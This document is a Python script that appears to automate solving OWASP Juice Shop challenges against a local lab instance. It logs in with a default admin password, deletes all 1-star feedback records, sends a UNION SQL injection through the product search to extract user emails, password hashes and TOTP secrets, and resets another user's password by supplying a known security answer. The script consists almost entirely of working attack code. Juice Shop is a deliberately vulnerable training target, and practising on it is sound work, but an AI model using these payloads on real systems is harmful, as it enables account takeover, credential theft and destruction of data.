import urllib.request
import json
import sys

def make_request(url, method='GET', headers=None, data=None):
    if headers is None:
        headers = {}
    req_data = None
    if data is not None:
        req_data = json.dumps(data).encode('utf-8')
        headers['Content-Type'] = 'application/json'
    
    req = urllib.request.Request(url, data=req_data, headers=headers, method=method)
    try:
        with urllib.request.urlopen(req) as response:
            content_type = response.headers.get('Content-Type', '')
            res_data = response.read()
            res_text = res_data.decode('utf-8', errors='ignore')
            return response.status, json.loads(res_text) if res_text else {}
    except urllib.error.HTTPError as e:
        res_data = e.read().decode('utf-8', errors='ignore')
        print("HTTP Error {} for {}: {}".format(e.code, url, res_data))
        try:
            return e.code, json.loads(res_data)
        except Exception:
            return e.code, res_data
    except Exception as e:
        print("Error requesting {}: {}".format(url, e))
        return 500, {}

def solve():
    base_url = "http://192.168.99.100:3000"
    
    print("\n--- 1. Login as Admin ---")
    login_url = "{}/rest/user/login".format(base_url)
    admin_payload = {"email": "admin@juice.org", "password": "admin123"}
    status, res = make_request(login_url, 'POST', data=admin_payload)
    if status == 200:
        admin_token = res.get('authentication', {}).get('token')
        admin_email = res.get('authentication', {}).get('umail')
        print("Successfully logged in as: {}".format(admin_email))
    else:
        print("Failed to login as admin")
        return False
        
    print("\n--- 2. Fetch and Delete 1-Star Feedbacks ---")
    feedback_url = "{}/api/Feedbacks/".format(base_url)
    headers = {"Authorization": "Bearer {}".format(admin_token)}
    status, res = make_request(feedback_url, 'GET', headers=headers)
    if status == 200:
        feedbacks = []
        if isinstance(res, list):
            feedbacks = res
        elif isinstance(res, dict) and 'data' in res:
            feedbacks = res['data']
        
        print("Found {} feedbacks total.".format(len(feedbacks)))
        deleted_count = 0
        for fb in feedbacks:
            rating = fb.get('rating')
            fb_id = fb.get('id')
            if rating == 1:
                print("Deleting feedback ID {} with 1-star rating...".format(fb_id))
                del_url = "{}/api/Feedbacks/{}".format(base_url, fb_id)
                del_status, del_res = make_request(del_url, 'DELETE', headers=headers)
                if del_status == 200:
                    deleted_count += 1
                    print("Deleted feedback ID {}".format(fb_id))
                else:
                    print("Failed to delete feedback ID {}, status: {}".format(fb_id, del_status))
        print("Successfully deleted {} 1-star feedbacks.".format(deleted_count))
    else:
        print("Failed to fetch feedbacks, status: {}".format(status))
        return False

    print("\n--- 3. SQL Injection to Retrieve Users (GDPR) ---")
    sqli_url = "{}/rest/products/search?q=%27))%20union%20select%20null,id,email,password,totpsecret,null,null,null,null%20from%20users--".format(base_url)
    status, res = make_request(sqli_url, 'GET')
    if status == 200:
        print("Successfully executed SQL Injection! GDPR challenge should be solved.")
    else:
        print("Failed SQL Injection query, status: {}".format(status))
        return False

    print("\n--- 4. Reset Bjoern's Password ---")
    reset_url = "{}/rest/user/reset-password".format(base_url)
    reset_payload = {
        "email": "bjoern@owasp.org",
        "answer": "Zaya",
        "new": "new_password123",
        "repeat": "new_password123"
    }
    status, res = make_request(reset_url, 'POST', data=reset_payload)
    if status == 200:
        print("Successfully reset Bjoern's password!")
    else:
        print("Failed to reset Bjoern's password, status: {}".format(status))
        return False

    print("\nAll tasks completed successfully!")
    return True

if __name__ == '__main__':
    solve()
